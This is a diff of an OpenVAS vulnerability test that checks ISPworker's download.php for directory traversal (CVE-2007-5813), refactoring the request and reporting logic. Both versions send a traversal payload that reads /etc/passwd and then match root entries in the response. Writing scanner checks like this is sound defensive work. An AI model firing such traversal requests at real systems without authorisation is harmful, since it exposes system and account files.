@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: ISPworker_26277.nasl 4970 2017-01-09 15:00:59Z teissa $
+# $Id: ISPworker_26277.nasl 5771 2017-03-29 15:14:22Z cfi $
 #
 # ISPworker Download.PHP Multiple Directory Traversal Vulnerabilities
 #
@@ -33,23 +33,19 @@ information that could aid in further attacks.
 These issues affect ISPworker 1.21 and 1.23; other versions may also
 be affected.";
 
-
-if (description)
+if(description)
 {
  script_id(100370);
- script_version("$Revision: 4970 $");
- script_tag(name:"last_modification", value:"$Date: 2017-01-09 16:00:59 +0100 (Mon, 09 Jan 2017) $");
+ script_version("$Revision: 5771 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-29 17:14:22 +0200 (Wed, 29 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-12-02 17:30:58 +0100 (Wed, 02 Dec 2009)");
  script_bugtraq_id(26277);
  script_cve_id("CVE-2007-5813");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-
  script_name("ISPworker Download.PHP Multiple Directory Traversal Vulnerabilities");
-
-
- script_category(ACT_GATHER_INFO);
-  script_tag(name:"qod_type", value:"remote_vul");
+ script_category(ACT_ATTACK);
+ script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -63,18 +59,13 @@ if (description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
    
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
-
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list("/ispworker",cgi_dirs());
+foreach dir( make_list_unique( "/ispworker", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
-   
+  if( dir == "/" ) dir = "";
   url = string(dir, "/module/biz/index.php"); 
   req = http_get(item:url, port:port);
   buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);  
@@ -83,18 +74,14 @@ foreach dir (dirs) {
   if(egrep(pattern: "Login - ISPworker", string: buf, icase: TRUE) &&
      egrep(pattern: "start_authentication", string: buf, icase: TRUE)) {
     
-      url = string(dir,"/module/ticket/download.php?ticketid=../../../../../../../../../etc/passwd%00");
-      req = http_get(item:url, port:port);
-      buf = http_keepalive_send_recv(port:port, data:req,bodyonly:FALSE);
-      if( buf == NULL )exit(0);
+    url = string(dir,"/module/ticket/download.php?ticketid=../../../../../../../../../etc/passwd%00");
 
-      if(egrep(pattern: "root:.*:0:[01]:.*", string: buf, icase: TRUE)) {
-
-        security_message(port:port);
-        exit(0);
-
-      }
+    if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:.*")) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
+    }
   }
 }
 
-exit(0);
+exit( 99 );
